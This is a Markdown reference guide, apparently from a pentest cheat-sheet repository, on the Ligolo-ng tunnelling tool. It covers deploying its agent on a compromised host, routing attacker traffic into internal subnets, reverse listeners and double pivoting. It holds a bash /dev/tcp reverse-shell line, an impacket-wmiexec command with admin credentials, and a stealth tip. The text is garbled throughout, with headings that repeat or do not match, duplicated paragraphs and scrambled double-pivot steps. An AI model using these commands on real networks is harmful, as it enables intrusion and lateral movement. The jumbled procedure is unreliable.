# 🔀 Ligolo-ng - Guía de referencia completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)



```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
</p>

<p align="center">
  <b>🌐 Modern, simple, and high-performance pivoting tool using TUN interfaces instead of SOCKS proxies</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introduction)
- [Why Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
- [Architecture & How It Works](#-architecture--how-it-works)
- [Instalación](#-installation)
- [Quick Start Guide](#-quick-start-guide)
  - [Instalación](#step-1-setup-tun-interface-on-attacker)
  - [Instalación](#step-2-start-the-ligolo-ng-proxy)
  - [Run the proxy using self-signed TLS certificates:](#step-3-deploy-the-agent-on-pivot-target)
  - [On Linux Target:](#step-4-configure-routing-on-attacker)
  - [Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).](#step-5-start-the-tunnel-session)
- [Reverse Port Forwarding (Listeners)](#-reverse-port-forwarding-listeners)
- [Double Pivoting (Multi-Tier Pivoting)](#-double-pivoting-multi-tier-pivoting)
- [Recursos y referencias](#-proxy-interactive-commands-reference)
- [Opciones y parámetros](#-agent-command-line-options)
- [Troubleshooting & Best Practices](#-troubleshooting--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Recursos y referencias](#-resources)

---

## 🎯 Introducción

**Ligolo-ng** is an advanced, lightweight, and fast tunneling and pivoting tool written in Go. Unlike traditional SOCKS proxies (such as standard Chisel or SSH dynamic forwarding), Ligolo-ng establishes a virtual **TUN interface** directly on your attacker machine.

This turns your compromised pivot host into a true VPN-like gateway: all tools on your attacker machine (including `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket`, and browsers) can access internal subnets directly by IP address without prefixing commands with `proxychains`.

---

## ⚖️ Why Ligolo-ng?

|Feature|Ligolo-ng|Proxychains + SOCKS|SSH SOCKS (`-D`)|
|---------|-----------|---------------------|------------------|
|**Protocol Support**|Full TCP & UDP|TCP only (poor UDP)|TCP only|
|**Nmap SYN Scan (`-sS`)**|✅ Yes (Native)|❌ No (Requires TCP `-sT`)|❌ No|
|**Tool Compatibility**|100% (Kernel IP stack)|Inconsistent (LD_PRELOAD)|Inconsistent|
|**Speed & Latency**|⭐⭐⭐⭐⭐ Very Fast|⭐⭐⭐ Moderate|⭐⭐⭐ Moderate|
|**No SOCKS Wrapper**|✅ Yes|❌ Requires wrapper|❌ Requires wrapper|
|**Reverse Listeners**|✅ Built-in|❌ Requires separate tool|❌ Limited|

---

## 🏗️ Architecture & How It Works

```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```

1. **Proxy:** Runs on your attacker machine, manages sessions, and bridges packets between your virtual TUN interface and connected agents.
2. **Agent:** A lightweight binary executed on the compromised internal machine (Linux, Windows, macOS, or ARM).
3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.

---

## 📥 Instalación

3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.

```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```

---

## 🚀 Sintaxis básica

### Instalación

Before running the proxy, create a persistent TUN device on your Linux attacker machine:

```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```

### Instalación

Before running the proxy, create a persistent TUN device on your Linux attacker machine:

```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```

Step 2: Start the Ligolo-ng Proxy

### Run the proxy using self-signed TLS certificates:

Transfer the agent to your compromised host and execute it:

#### > **Tip:** You can also provide valid Let's Encrypt certificates using `-certfile` and `-keyfile` for stealth in Red Team engagements.
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```

#### On Windows Target:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```

### On Linux Target:

Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).

On your **attacker terminal** (separate window), add a route pointing to the TUN interface:

```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```

### Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).

On your **attacker terminal** (separate window), add a route pointing to the TUN interface:

```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```

Step 5: Start the Tunnel Session

```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```

---

## 🔄 Reverse Port Forwarding (Listeners)

Want to receive a reverse shell or catch an NTLM authentication relay on your attacker box from an internal host that cannot route back to your attacker IP? Use **listeners**!

When you configure a listener in Ligolo-ng, the agent opens a listening port on the **pivot machine** and relays incoming traffic back to your attacker machine.

### Ejemplos prácticos

Inside the proxy session:

```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```

Ejemplos prácticos

```bash
nc -lvnp 4444
```

On an **internal target** (`172.16.1.75`):

```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```

The pivot host forwards the connection straight to your Netcat listener!

---

## ⛓️ Double Pivoting (Multi-Tier Pivoting)

The pivot host forwards the connection straight to your Netcat listener!

1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
2. Discover Pivot 2 located in Subnet B (`10.0.0.25`).
⛓️ Double Pivoting (Multi-Tier Pivoting)
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
When accessing deeply nested networks (Subnet A -> Subnet B -> Subnet C):
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
3. Set up a listener on Pivot 1 to forward traffic from Subnet B back to your proxy port `11601`:

---

## ⌨️ Recursos y referencias

|Comando|Descripción|Ejemplo|
|---------|-------------|---------|
|`session`|List and select active connected agent sessions|`session`|
|`start`|Start tunneling packets through the active agent|`start`|
|`stop`|Stop the active tunnel session|`stop`|
|`ifconfig`|Show network interfaces of the selected agent|`ifconfig`|
|`listener_add`|Create a listening port on the pivot agent|`listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443`|
|`listener_list`|List all active listeners on current agent|`listener_list`|
|`listener_close`|Close a specific active listener|`listener_close --id 0`|
|`help`|Display command help|`help`|
|`exit`|Terminate proxy or return to main menu|`exit`|

---

## ⚙️ Opciones y parámetros

|Flag|Descripción|Ejemplo|
|------|-------------|---------|
|`-connect`|Address and port of the Ligolo proxy|`-connect 192.168.1.100:11601`|
|`-ignore-cert`|Skip TLS certificate verification|`-ignore-cert`|
|`-retry`|Automatically retry connection if disconnected|`-retry`|
|`-auto-clear`|Clear terminal output upon execution|`-auto-clear`|

---

## 💡 Consejos y mejores prácticas

1. **Delete TUN Interface After Engagement:**
   When finished with your test, clean up your routing table and delete the virtual interface:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Double-Check IP Subnet Overlaps:**
   Ensure the internal subnet you are routing (e.g. `192.168.1.0/24`) does not collide with your local attacker network. If it overlaps, use a more specific `/32` host route (e.g., `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Firewall Considerations on Pivot:**
1. **Delete TUN Interface After Engagement:
4. **Use `-retry` in Real Environments:**
   Always run agents with `-retry` to automatically re-establish connections after transient network drops.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** Ligolo-ng is a powerful network routing utility. It must only be utilized during authorized penetration tests, red team engagements, and ethical security evaluations with explicit written consent.

---

## 📚 Recursos y referencias

- [Official Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [Official Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
